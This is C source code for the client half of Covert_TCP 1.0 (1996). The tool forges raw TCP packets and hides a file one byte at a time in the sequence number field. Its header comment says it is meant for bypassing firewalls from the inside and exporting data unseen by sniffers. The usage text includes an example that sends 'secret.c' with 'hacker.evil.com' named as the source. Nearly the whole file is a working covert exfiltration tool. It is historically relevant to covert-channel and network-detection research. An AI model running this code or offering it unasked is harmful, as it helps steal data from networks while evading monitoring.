/* Covert_TCP 1.0 - Covert channel file transfer for Linux
* Written by Craig H. Rowland (crowland@psionic.com)
* Copyright 1996 Craig H. Rowland (11-15-96)
* NOT FOR COMMERCIAL USE WITHOUT PERMISSION. 
* 
*
* This program manipulates the TCP/IP header to transfer a file one byte
* at a time to a destination host. This progam can act as a server and a client
* and can be used to conceal transmission of data inside the IP header. 
* This is useful for bypassing firewalls from the inside, and for 
* exporting data with innocuous looking packets that contain no data for 
* sniffers to analyze. In other words, spy stuff... :)
*
* PLEASE see the enclosed paper for more information!!
*
* This software should be used at your own risk. 
*
* compile: cc -o covert_tcp covert_tcp.c
*
* 
* Portions of this code based on ping.c (c) 1987 Regents of the 
* University of California. (See function in_cksm() for details)
*
* Small portions from various packet utilities by unknown authors
*/

#include "client.h"

int main(int argc, char *argv[]) {

   unsigned int source_host=0,dest_host=0;
   unsigned short source_port=0,dest_port=80;
   int seq=0,file=0;
   int count;
   char desthost[80],srchost[80],filename[80];

   if(geteuid() !=0)
    {
    printf("\nYou need to be root to run this because it use sock_raw.\n\n");
    exit(0);
    }
    
   if(argc != 11)
   {
   usage(argv[0]);
   exit(0);
   }    

   for(count=0; count < argc; ++count)
    {
    if (strcmp(argv[count],"-dest") == 0)
     {
     dest_host=host_convert(argv[count+1]); 
     strncpy(desthost,argv[count+1],79);
     }
     
    else if (strcmp(argv[count],"-source") == 0)
     {
     source_host=host_convert(argv[count+1]); 
     strncpy(srchost,argv[count+1],79);
     }

    else if (strcmp(argv[count],"-file") == 0)
     {
     strncpy(filename,argv[count+1],79);
     file=1;
     }

    else if (strcmp(argv[count],"-source_port") == 0)
      source_port=atoi(argv[count+1]);

    else if (strcmp(argv[count],"-dest_port") == 0)
      dest_port=atoi(argv[count+1]);
    }


    seq=1; 

   if(file != 1)
    {
    printf("\n\nYou need to supply a filename (-file <filename>)\n\n");
    exit(1);
    }

     if (source_host == 0 && dest_host == 0)
      {
      printf("\n\nYou need to supply a source and destination address for client mode.\n\n");
      exit(1);
      }

     else
      {
      printf("Destination Host: %s\n",desthost);
      printf("Source Host     : %s\n",srchost);

       if(source_port == 0)
        printf("Originating Port: random\n");

       else
        printf("Originating Port: %u\n",source_port);

      printf("Destination Port: %u\n",dest_port);
      printf("Encoded Filename: %s\n",filename);

      printf("Encoding Type   : IP Sequence Number\n");

      printf("\nClient Mode: Sending data.\n\n");
     }
     
     forgepacket(source_host, dest_host, source_port, dest_port,filename,seq);
     exit(0);
}

void forgepacket(unsigned int source_addr, unsigned int dest_addr, unsigned \
short source_port, unsigned short dest_port, char *filename, int seq) {
   struct send_tcp
   {
      struct iphdr ip;
      struct tcphdr tcp;
   } send_tcp;


   struct pseudo_header
   {
      unsigned int source_address;
      unsigned int dest_address;
      unsigned char placeholder;
      unsigned char protocol;
      unsigned short tcp_length;
      struct tcphdr tcp;
   } pseudo_header;

   int ch;
   int send_socket;
   struct sockaddr_in sin;
   FILE *input;
   
	srand((getpid())*(dest_port)); 
	
	if((input=fopen(filename,"rb"))== NULL)
 {
 printf("I cannot open the file %s for reading\n",filename);
 exit(1);
 }

else while((ch=fgetc(input)) !=EOF)
 {

	sleep(1);


   send_tcp.ip.ihl = 5;
   send_tcp.ip.version = 4;
   send_tcp.ip.tos = 0;
   send_tcp.ip.tot_len = htons(40);
   send_tcp.ip.id =(int)(255.0*rand()/(RAND_MAX+1.0)); 
   send_tcp.ip.frag_off = 0;
   send_tcp.ip.ttl = 64; 
   send_tcp.ip.protocol = IPPROTO_TCP;
   send_tcp.ip.check = 0;
   send_tcp.ip.saddr = source_addr;
   send_tcp.ip.daddr = dest_addr;

if(source_port == 0) 
   send_tcp.tcp.source = 1+(int)(10000.0*rand()/(RAND_MAX+1.0));

else 
   send_tcp.tcp.source = htons(source_port);

   send_tcp.tcp.seq = ch;

   send_tcp.tcp.dest = htons(dest_port);

   send_tcp.tcp.ack_seq = 0;
   send_tcp.tcp.res1 = 0;
   send_tcp.tcp.doff = 5;
   send_tcp.tcp.fin = 0;
   send_tcp.tcp.syn = 1;
   send_tcp.tcp.rst = 0;
   send_tcp.tcp.psh = 0;
   send_tcp.tcp.ack = 0;
   send_tcp.tcp.urg = 0;
   send_tcp.tcp.ece = 0;
   send_tcp.tcp.window = htons(512);
   send_tcp.tcp.check = 0;
   send_tcp.tcp.urg_ptr = 0;

   sin.sin_family = AF_INET;
   sin.sin_port = send_tcp.tcp.source;
   sin.sin_addr.s_addr = send_tcp.ip.daddr;   

   send_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
   if(send_socket < 0)
   {
      perror("send socket cannot be open. Are you root?");
      exit(1);
   }

      send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
      
      pseudo_header.source_address = send_tcp.ip.saddr;
      pseudo_header.dest_address = send_tcp.ip.daddr;
      pseudo_header.placeholder = 0;
      pseudo_header.protocol = IPPROTO_TCP;
      pseudo_header.tcp_length = htons(20);

      bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);

      send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32);

      sendto(send_socket, &send_tcp, 40, 0, (struct sockaddr *)&sin, sizeof(sin));
      printf("Sending Data: %c\n",ch);

  close(send_socket);
 } 

fclose(input);
} 


unsigned int host_convert(char *hostname){
   static struct in_addr i;
   struct hostent *h;
   i.s_addr = inet_addr(hostname);
   if(i.s_addr == -1)
   {
      h = gethostbyname(hostname);
      if(h == NULL)
      {
         fprintf(stderr, "cannot resolve %s\n", hostname);
         exit(0);
      }
      bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
   }
   return i.s_addr;
}

unsigned short in_cksum(unsigned short *ptr, int nbytes){
        register long           sum;            /* assumes long == 32 bits 
*/
        u_short                 oddbyte;
        register u_short        answer;         /* assumes u_short == 16 bits */

        /*
         * Our algorithm is simple, using a 32-bit accumulator (sum),
         * we add sequential 16-bit words to it, and at the end, fold back
         * all the carry bits from the top 16 bits into the lower 16 bits.
         */

        sum = 0;
        while (nbytes > 1)  {
                sum += *ptr++;
                nbytes -= 2;
        }

                                /* mop up an odd byte, if necessary */
        if (nbytes == 1) {
                oddbyte = 0;            /* make sure top half is zero */
                *((u_char *) &oddbyte) = *(u_char *)ptr;   /* one byte only */
                sum += oddbyte;
        }

        /*
         * Add back carry outs from top 16 bits to low 16 bits.
         */

        sum  = (sum >> 16) + (sum & 0xffff);    /* add high-16 to low-16 */
        sum += (sum >> 16);                     /* add carry */
        answer = ~sum;          /* ones-complement, then truncate to 16 bits 
*/
        return(answer);
}


void usage(char *progname){

      printf("Covert TCP usage: \n%s -dest dest_ip -source source_ip -file \
filename -source_port port -dest_port port\n\n", 
progname);
      printf("-dest dest_ip      - Host to send data to.\n");
      printf("-source source_ip  - Host where you want the data to originate \
from.\n");
      printf("-source_port port  - IP source port you want data to appear from. \n");
      printf("                     (randomly set by default)\n");
      printf("-dest_port port    - IP source port you want data to go to. In\n");
      printf("                     SERVER mode this is the port data will be coming\n");
      printf("                     inbound on. Port 80 by default.\n");
      printf("-file filename     - Name of the file to encode and transfer.\n");
      printf("\nPress ENTER for examples.");
      getchar();
      printf("\nExample: \nclient -dest foo.bar.com -source hacker.evil.com - \
source_port 1234 -dest_port 80 -file secret.c\n\n");
      printf("Above sends the file secret.c to the host hacker.evil.com a byte \n");
      printf("at a time using the default IP packet ID encoding.\n");
      exit(0);
}
